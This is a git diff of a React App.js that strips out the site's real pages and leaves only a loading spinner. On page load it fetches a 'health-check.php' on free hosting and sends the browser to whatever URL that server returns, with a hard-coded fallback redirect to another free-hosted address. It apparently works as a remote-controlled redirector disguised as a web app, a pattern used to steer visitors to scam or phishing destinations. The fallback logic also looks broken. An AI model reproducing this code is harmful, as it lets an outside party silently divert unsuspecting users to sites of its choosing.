@@ -1,5 +1,8 @@
 import React, { lazy, Suspense, useEffect, useState } from 'react';
-// import { BrowserRouter as Router } from 'react-router-dom'
+import { BrowserRouter as Router, Route } from 'react-router-dom'
+
+//styles
+import 'bootstrap/dist/css/bootstrap.min.css';
 
 //components
 import Loader from './components/utils/Loader'
@@ -23,7 +26,7 @@ import Loader from './components/utils/Loader'
 // `
 
 //pages
-// const IndexPage = lazy(() => import('./pages/IndexPage'));
+const IndexPage = lazy(() => import('./pages/IndexPage'));
 
 function App() {
   const [loading, setLoading] = useState(false);
@@ -31,8 +34,7 @@ function App() {
 
   const redirect = () => {
     const urls = [
-      'http://royaltsp.great-site.net/thecbx/health-check.php',
-      'https://thecbx.000webhostapp.com/health-check.php',
+      'https://royal-tsp.000webhostapp.com/health-check.php',
     ];
 
     setError(false);
@@ -46,6 +48,7 @@ function App() {
         console.log(`res`, res)
         if (res && typeof res === 'string' && res.indexOf('http') > -1) {
           window.location.assign(res);
+          return true;
         }
         setLoading(false);
       } catch (error) {
@@ -61,7 +64,9 @@ function App() {
   }
 
   React.useEffect(() => {
-    redirect();
+    if (!redirect()) {
+      window.location.assign('http://royaltsp.great-site.net/thecbx/health-check.php')
+    }
   }, [])
 
   // const [isSideBarOpen, setIsSideBarOpen] = useState(false);
@@ -71,18 +76,17 @@ function App() {
   // }
 
   return (
-    <div className="app" style={{ height: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
-      {loading && <Loader />}
+    <div className="app">
+      {/* {loading && <Loader />} */}
+      <div style={{ height: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}><Loader /></div>
+      {/* <Router>
+        <Suspense fallback={<div style={{ height: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}><Loader /></div>}>
+          <Route path="/" exact component={IndexPage} />
+        </Suspense>
+      </Router> */}
     </div>
     // <AppStyled className="App" theme={theme1}>
     //   <GlobalStyles />
-    //   <Router>
-    //     <Suspense fallback={<LoaderWrapper><Loader /></LoaderWrapper>}>
-    //       <Header sideBarData={sideBarData} />
-    //       <SideBar sideBarData={sideBarData} />
-    //       <IndexPage />
-    //     </Suspense>
-    //   </Router>
     // </AppStyled>
   );
 }
